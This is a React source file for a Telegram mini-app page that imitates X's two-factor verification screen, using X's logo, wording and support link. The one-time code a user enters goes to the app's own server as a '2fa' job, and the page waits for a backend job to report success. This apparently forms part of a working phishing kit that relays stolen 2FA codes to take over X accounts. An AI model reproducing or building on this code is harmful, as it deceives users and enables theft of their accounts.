//mini-app/src/pages/TwoFA.tsx
import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import axios from "axios";
import { useSignal, initData } from "@tma.js/sdk-react";
import "./TwoFA.css";

import type {
  JobsStatusResponse,
  JobCommandResponse,
} from "../../../server/src/types/jobs";

import { FullScreenLoader } from "../components/FullScreenLoader";
import { Toast } from "../components/Toast";
import { API_BASE } from "../config/api";

export const TwoFA = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const initDataRaw = useSignal(initData.raw);

  const [username, setUsername] = useState("");
  const [avatarUrl, setAvatarUrl] = useState<string | null>(null);
  const [code, setCode] = useState("");

  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState("");

  useEffect(() => {
    const state = location.state as {
      username?: string;
      avatarUrl?: string;
    } | null;

    if (state?.username) setUsername(state.username);
    if (state?.avatarUrl) setAvatarUrl(state.avatarUrl);
  }, [location.state]);

  const pollCommandUntilDone = async (commandId: string, maxMs = 20000) => {
    const start = Date.now();

    while (Date.now() - start < maxMs) {
      const resp = await axios.post<JobsStatusResponse>(
        `${API_BASE}/jobs/status`,
        { initData: initDataRaw },
        { headers: { "Content-Type": "application/json" } }
      );

      const cs = resp.data.commandState;

      if (!cs) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      if (cs.commandId !== commandId) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      if (cs.status === "pending" || cs.status === "running") {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      return cs;
    }

    return null;
  };

  const handleNext = async () => {
    setToast("");

    if (!initDataRaw) {
      setToast("Telegram initData missing");
      return;
    }

    const otp = code.trim();
    if (!otp) {
      setToast("Please enter the 2FA code");
      return;
    }

    try {
      setLoading(true);

      const cmdResp = await axios.post<JobCommandResponse>(
        `${API_BASE}/jobs/command`,
        {
          initData: initDataRaw,
          command: {
            type: "2fa",
            payload: { code: otp },
          },
        },
        { headers: { "Content-Type": "application/json" } }
      );

      if (!cmdResp.data.ok) {
        setLoading(false);
        setToast(cmdResp.data.error || "Command failed");
        return;
      }

      const commandId = cmdResp.data.commandId;
      if (!commandId) {
        setLoading(false);
        setToast("Missing commandId from server");
        return;
      }

      const finalState = await pollCommandUntilDone(commandId);

      setLoading(false);

      if (!finalState) {
        setToast("Timeout, please try again");
        return;
      }

      if (finalState.status === "done" && finalState.result?.ok) {
        console.log("✅ 2FA OK", finalState.result);
        navigate("/", { state: { username } });
        return;
      }

      const msg =
        finalState.error ||
        finalState.result?.message ||
        finalState.result?.error ||
        "Invalid 2FA code";
      setToast(msg);
    } catch (err: any) {
      setLoading(false);
      setToast(err.response?.data?.error || err.message || "Network error");
    }
  };

  // Fallback pour l'avatar et le nom d'utilisateur
  const displayUsername = username || "Username";
  const displayScreenName = username ? `@${username}` : "@username";

  return (
    <div className="twofa-page">
      <FullScreenLoader visible={loading} text="Verifying code..." />
      <Toast message={toast} onClose={() => setToast("")} />

      <div className="twofa-modal" role="dialog" aria-modal="true">
        {/* Header */}
        <div className="twofa-header">
          <div className="twofa-header-content">
            <div className="twofa-close-button-container">
              <button
                className="twofa-close-button"
                aria-label="Close"
                type="button"
                onClick={() => navigate(-1)}
              >
                <svg
                  viewBox="0 0 24 24"
                  aria-hidden="true"
                  className="twofa-close-icon"
                >
                  <g>
                    <path d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"></path>
                  </g>
                </svg>
              </button>
            </div>
            <div className="twofa-logo-container">
              <svg
                viewBox="0 0 24 24"
                aria-label="X"
                role="img"
                className="twofa-logo"
              >
                <g>
                  <path d="M21.742 21.75l-7.563-11.179 7.056-8.321h-2.456l-5.691 6.714-4.54-6.714H2.359l7.29 10.776L2.25 21.75h2.456l6.035-7.118 4.818 7.118h6.191-.008zM7.739 3.818L18.81 20.182h-2.447L5.29 3.818h2.447z"></path>
                </g>
              </svg>
            </div>
            <div className="twofa-header-spacer"></div>
          </div>
        </div>

        {/* Content */}
        <div className="twofa-content">
          <div className="twofa-title-container">
            <h1 className="twofa-title" id="modal-header">
              Enter your verification code
            </h1>
            <div className="twofa-description">
              <span>
                Use your code generator app and enter the code below.
              </span>
            </div>
          </div>

          {/* User Display */}
          <div className="twofa-user-display">
            <div className="twofa-user-avatar">
              {avatarUrl ? (
                <img src={avatarUrl} alt={displayUsername} />
              ) : (
                <div className="twofa-user-avatar-fallback">
                  {displayUsername.charAt(0).toUpperCase()}
                </div>
              )}
            </div>
            <div className="twofa-user-info">
              <div className="twofa-user-name">{displayUsername}</div>
              <div className="twofa-user-handle">{displayScreenName}</div>
            </div>
          </div>

          {/* Form */}
          <div className="twofa-form">
            <label className="twofa-label">
              <div className="twofa-label-text">
                <span>Enter the code</span>
              </div>
              <div className="twofa-input-wrapper">
                <input
                  type="text"
                  name="text"
                  autoComplete="on"
                  autoCapitalize="none"
                  autoCorrect="off"
                  inputMode="numeric"
                  spellCheck="false"
                  dir="auto"
                  className="twofa-input"
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  disabled={loading}
                  onKeyDown={(e) => {
                    if (e.key === "Enter" && !loading && code.trim()) {
                      handleNext();
                    }
                  }}
                />
              </div>
            </label>

            <div className="twofa-links">
              <button
                type="button"
                className="twofa-link-button"
                onClick={() => {
                  // TODO: Implement alternative verification method
                }}
              >
                Choose another verification method
              </button>
              <a
                href="https://help.twitter.com/forms/account-access/regain-access"
                target="_blank"
                rel="noopener noreferrer nofollow"
                className="twofa-link-button"
              >
                Contact X Support
              </a>
            </div>

            <button
              className="twofa-next-button"
              onClick={handleNext}
              disabled={loading || !code.trim()}
              type="button"
            >
              <span>Next</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};
